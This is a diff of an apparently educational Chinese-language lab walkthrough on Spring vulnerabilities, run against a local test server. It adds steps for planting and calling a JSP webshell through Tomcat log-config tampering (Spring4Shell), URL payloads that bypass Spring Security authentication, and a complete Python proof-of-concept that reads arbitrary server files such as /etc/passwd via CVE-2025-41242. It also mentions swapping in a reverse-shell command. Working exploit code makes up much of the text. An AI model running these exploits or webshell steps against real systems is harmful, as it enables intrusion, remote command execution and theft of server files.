@@ -604,6 +604,9 @@ ls -l /tmp/success
 
 在 JDK 9+ 上运行的 Spring MVC 应用，若以 WAR 包形式部署在 Tomcat 中，攻击者可通过数据绑定修改 Tomcat 日志配置，写入 JSP Webshell。
 
+服务启动后，访问 `http://192.168.197.88:8080/?name=Bob&age=25` 即可看到一个演示页面。
+![](images/Pasted%20image%2020261010215805.png)
+
 **① 修改 Tomcat 日志配置**
 
 发送以下 GET 请求：
@@ -615,67 +618,227 @@ c1: Runtime
 c2: <%
 DNT: 1
 ```
-
+![](images/Pasted%20image%2020261010221059.png)
 **② 访问 Webshell**
 
 ```text wrap
 http://192.168.197.88:8080/tomcatwar.jsp?pwd=j&cmd=id
 ```
-
+![](images/Pasted%20image%2020261010221121.png)
 **③ 清理配置**
 
-利用完成后，必须将 pattern 设置为空，否则每次请求都会写入新的恶意代码：
+利用完成后，必须将 pattern 设置为空，否则每次请求都会写入新的恶意代码在 JSP Webshell 中，导致这个文件变得很大，发送如下数据包将其设置为空：
 ```http wrap
 GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern= HTTP/1.1
 Host: 192.168.197.88:8080
 ```
+![](images/Pasted%20image%2020261010221209.png)
+将 `cmd=id` 替换为反弹 Shell 命令即可获取 Shell，后续不再演示。
 
-> **注意**：该漏洞会修改目标服务器配置，实际测试中可能导致目标需要重启才能恢复，请谨慎操作。
+> **注意**：该漏洞会修改目标服务器配置，实际测试中可能导致目标崩溃（需要重启才能恢复），请谨慎操作。
 
 ### 9. CVE-2022-22978（Spring Security 认证绕过）
 
-Spring Security 5.5.6、5.6.3 及更早版本中，使用带有 `.` 的正则表达式的 `RegexRequestMatcher` 存在认证绕过漏洞。
+Spring Security 用于在 Spring 框架中提供安全认证功能。在 Spring Security 5.5.6、5.6.3 及更早的不受支持版本中，使用带有 `.` 的正则表达式的 RegexRequestMatcher 的应用程序可能存在认证绕过漏洞。
 
 **① 正常访问被拒绝**
 
-访问 `http://192.168.197.88:8080/admin`，可以看到管理页面访问被阻止（403 Forbidden）。
-
+访问 `http://192.168.197.88:8080/admin/index`，可以看到管理页面访问被阻止（403 Forbidden）。
+![](images/Pasted%20image%2020261010222410.png)
 **② 绕过认证**
 
 访问以下 URL 即可绕过认证，成功访问管理页面：
 ```text wrap
-http://192.168.197.88:8080/admin/%0atest
-http://192.168.197.88:8080/admin/%0dtest
+http://192.168.197.88:8080/admin/%0aindex
+http://192.168.197.88:8080/admin/%0dindex
 ```
+`%0a` 和 `%0d` 是 URL 编码中的两个特殊字符：
+
+| 编码    | 字符   | ASCII 码 | 含义                      |
+| ----- | ---- | ------- | ----------------------- |
+| `%0a` | `\n` | 10      | 换行符（Line Feed，LF）       |
+| `%0d` | `\r` | 13      | 回车符（Carriage Return，CR） |
+
+
+![](images/Pasted%20image%2020261010223545.png)
+
+
+
+**注意：这个漏洞不能直接反弹 Shell。** 这个漏洞是认证绕过（Authorization Bypass），不是远程代码执行（RCE）。它只能让你绕过权限检查，访问原本需要登录才能访问的页面或接口，但并不能直接执行系统命令。
+
+**反弹 Shell 需要 RCE**：必须能在服务器上执行系统命令（例如调用 Runtime.exec()、上传 Webshell 等）。  CVE-2022-22978 本身不提供任何命令执行能力，所以无法直接弹 Shell。
+
+**如果想拿 Shell，需要结合其他利用点，例如：**
+- 后台有**文件上传**功能 → 上传 JSP Webshell
+- 后台有**命令执行**功能 → 直接执行反弹 Shell 命令
+- 后台有**反序列化**接口 → 触发反序列化 RCE
 
 ### 10. CVE-2025-41242（Spring + Jetty 路径穿越）
 
-Spring 框架的 `StringUtils.uriDecode` 存在 "Ghost Bits" 缺陷，高位 Unicode 字符的低 8 位被截断为 ASCII 字符，导致安全检查被绕过；而 Jetty 在后续处理时又将 `%u002e` 解码为 `.`，最终实现路径穿越。
+Spring 框架的 StringUtils.uriDecode 存在 "Ghost Bits" 缺陷，高位 Unicode 字符的低 8 位被截断为 ASCII 字符，导致安全检查被绕过。
+
+例如 `阮(U+962E)→0x2E='.'`、`严(U+4E25)→0x25='%'`、`灵(U+7075)→0x75='u'`、`丰(U+4E30)→0x30='0'`、`甲(U+7532)→0x32='2'`、`来(U+6765)→0x65='e'`，于是攻击者构造的字符串 `阮严灵丰丰甲来` 被静默地转换成 ASCII 字符串 `.%u002e`。
+
+而 Jetty 在后续处理时又将 `%u002e` 解码为 `.`，最终实现路径穿越。
 
 **① 漏洞触发条件**
 
-- 必须以 `阮严灵丰丰甲来` 的**原始 UTF-8 字节**直送服务端，不能预先 percent-encoding。
-- 目标文件名中至少有一个字符做 percent-encoding（如 `passwd` 写成 `passw%64`）。
-- 浏览器、curl、Burp Suite 等工具会自动规范化 URL，无法直接复现。
+- 必须以 `阮严灵丰丰甲来` 的**原始 UTF-8 字节**直送服务端，不能预先 percent-encoding（percent-encoding 就是 URL 编码，也叫百分号编码）。
+- 目标文件名中至少有一个字符做 percent-encoding（如 `passwd` 写成 `passw%64`），否则 Spring 的路径匹配会提前短路，根本不会调用到那段有问题的解码逻辑。。
+- 浏览器、curl、Burp Suite 等工具会自动规范化 URL，无法直接复现，因为它们在发送请求前会对 URL 路径做规范化处理，把高位 Unicode 字符自动编码为 ASCII（变成 `%E9%98%AE...` 或 `.%u002e`），从而破坏漏洞触发条件。要复现，必须使用允许逐字节构造并发送原始 HTTP 请求的工具。。
 
-**② 使用 Python socket 脚本**
+**② 方式一：使用 Python socket 脚本**
 
 目录下提供了 `poc.py`，它会将原始 UTF-8 字节直接写入 socket，绕过 URL 规范化：
+```python wrap
+#!/usr/bin/env python3
+"""
+PoC for CVE-2025-41242: Spring Framework path traversal via Jetty URI
+parsing inconsistency on embedded Jetty.
+"""
+from __future__ import annotations
+import argparse
+import socket
+import ssl
+import sys
+from urllib.parse import urlparse
+GHOST_BITS_SEG = '阮严灵丰丰甲来'.encode('utf-8')
+DEFAULT_PORTS = {'http': 80, 'https': 443}
+
+def encode_target_path(file_path: str) -> bytes:
+    """Strip the leading slash and percent-encode the last character.
+    Spring's path matcher short-circuits when no character is percent-encoded,
+    so at least one byte of the target filename must be encoded for the buggy
+    decoder to fire (e.g. 'passwd' -> 'passw%64').
+    """
+    path = file_path.lstrip('/')
+    if not path:
+        raise ValueError('file path must not be empty')
+    last = path[-1]
+    if not last.isascii():
+        raise ValueError('last character of the file path must be ASCII')
+    return path[:-1].encode('utf-8') + ('%%%02x' % ord(last)).encode()
+
+def parse_target(url: str) -> tuple[str, str, int]:
+    if '://' not in url:
+        url = 'http://' + url
+    parsed = urlparse(url)
+    if parsed.scheme not in DEFAULT_PORTS:
+        raise ValueError(
+            f'only http/https are supported (got {parsed.scheme!r})'
+        )
+    if not parsed.hostname:
+        raise ValueError(f'cannot parse host from {url!r}')
+    port = parsed.port or DEFAULT_PORTS[parsed.scheme]
+    return parsed.scheme, parsed.hostname, port
+
+def build_request(host: str, port: int, file_path: str) -> bytes:
+    encoded_target = encode_target_path(file_path)
+    path = b'/' + (GHOST_BITS_SEG + b'/') * 7 + encoded_target
+    host_header = f'{host}:{port}'.encode()
+    return (
+        b'GET ' + path + b' HTTP/1.1\r\n'
+        b'Host: ' + host_header + b'\r\n'
+        b'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36' + b'\r\n'
+        b'Connection: close\r\n\r\n'
+    )
+
+def send(
+    scheme: str,
+    host: str,
+    port: int,
+    request: bytes,
+    timeout: float,
+    insecure: bool,
+) -> bytes:
+    sock = socket.create_connection((host, port), timeout=timeout)
+    if scheme == 'https':
+        ctx = ssl.create_default_context()
+        if insecure:
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+        sock = ctx.wrap_socket(sock, server_hostname=host)
+    with sock:
+        sock.sendall(request)
+        chunks = []
+        while True:
+            chunk = sock.recv(4096)
+            if not chunk:
+                break
+            chunks.append(chunk)
+    return b''.join(chunks)
+
+def main() -> int:
+    parser = argparse.ArgumentParser(
+        description=(
+            'PoC for CVE-2025-41242: Spring Framework path traversal on '
+            'embedded Jetty. Reads an arbitrary file from the target server.'
+        ),
+        epilog='example: python poc.py http://192.168.1.160:8080 -f /etc/passwd',
+    )
+    parser.add_argument(
+        'target',
+        help='target URL or host:port, e.g. http://192.168.1.160:8080',
+    )
+    parser.add_argument(
+        '-f', '--file',
+        default='/etc/passwd',
+        help='absolute path of the file to read (default: /etc/passwd)',
+    )
+    parser.add_argument(
+        '--timeout', type=float, default=10.0,
+        help='socket timeout in seconds (default: 10)',
+    )
+    parser.add_argument(
+        '-k', '--insecure', action='store_true',
+        help='skip TLS certificate verification when using https',
+    )
+    args = parser.parse_args()
+    try:
+        scheme, host, port = parse_target(args.target)
+        request = build_request(host, port, args.file)
+    except ValueError as e:
+        print(f'error: {e}', file=sys.stderr)
+        return 2
+    try:
+        data = send(
+            scheme, host, port, request,
+            timeout=args.timeout, insecure=args.insecure,
+        )
+    except OSError as e:
+        print(
+            f'error: connection to {scheme}://{host}:{port} failed: {e}',
+            file=sys.stderr,
+        )
+        return 1
+    # Send response headers to stderr and the body to stdout, so the body can
+    # be redirected cleanly: `python poc.py <target> -f /etc/passwd > out`.
+    header, sep, body = data.partition(b'\r\n\r\n')
+    sys.stderr.buffer.write(header + sep)
+    sys.stderr.flush()
+    sys.stdout.buffer.write(body)
+    return 0
+
+if __name__ == '__main__':
+    raise SystemExit(main())
+```
+
+该POC脚本默认读取靶机环境中的 `/etc/passwd`：
 ```text wrap
 python3 poc.py http://192.168.197.88:8080
 ```
-
-读取其他文件：
+![](images/Pasted%20image%2020261010230414.png)
+可以指定读取其他文件：
 ```text wrap
 python3 poc.py http://192.168.197.88:8080 -f /etc/hosts
 ```
-
-HTTPS 目标加 `-k` 跳过证书校验：
+![](images/Pasted%20image%2020261010230429.png)
+HTTPS 目标加 `-k` 跳过证书校验（这个靶场没开HTTPS服务）：
 ```text wrap
 python3 poc.py https://192.168.197.88:8443 -f /etc/passwd -k
 ```
 
-**③ 使用 Yakit 原始数据包**
+**③ 方式二：使用 Yakit 原始数据包**
 
 在 Yakit 的 HTTP Fuzzer 中粘贴以下数据包：
 ```text wrap
@@ -685,7 +848,7 @@ Connection: close
 ```
 
 发送后即可看到 `/etc/passwd` 内容。
-
+![](images/Pasted%20image%2020261010231133.png)
 ## 三、漏洞原理总结
 
 | 漏洞编号 | CVE | 注入点 | 利用方式 |
